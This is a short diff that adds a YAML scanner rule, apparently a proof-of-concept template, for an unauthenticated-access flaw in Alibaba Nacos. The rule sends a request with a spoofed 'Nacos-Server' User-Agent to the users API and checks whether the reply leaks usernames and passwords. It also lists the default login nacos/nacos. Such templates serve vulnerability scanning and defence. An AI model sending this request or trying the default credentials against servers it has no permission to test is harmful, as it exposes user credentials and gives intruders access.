@@ -1,0 +1,15 @@
+name: poc-yaml-alibaba-nacos-api-unauth
+rules:
+  - method: GET
+    path: /nacos/v1/auth/users?pageNo=1&pageSize=9
+    headers:
+      User-Agent: Nacos-Server
+    follow_redirects: true
+    expression: |
+      response.content_type.contains("application/json") && response.body.bcontains(bytes("totalCount")) && response.body.bcontains(bytes("pagesAvailable")) && response.body.bcontains(bytes("username")) && response.body.bcontains(bytes("password"))
+detail:
+  author: AgeloVito
+  info: alibaba-nacos-api-unauth
+  login: nacos/nacos
+  links:
+    - https://blog.csdn.net/caiqiiqi/article/details/112005424
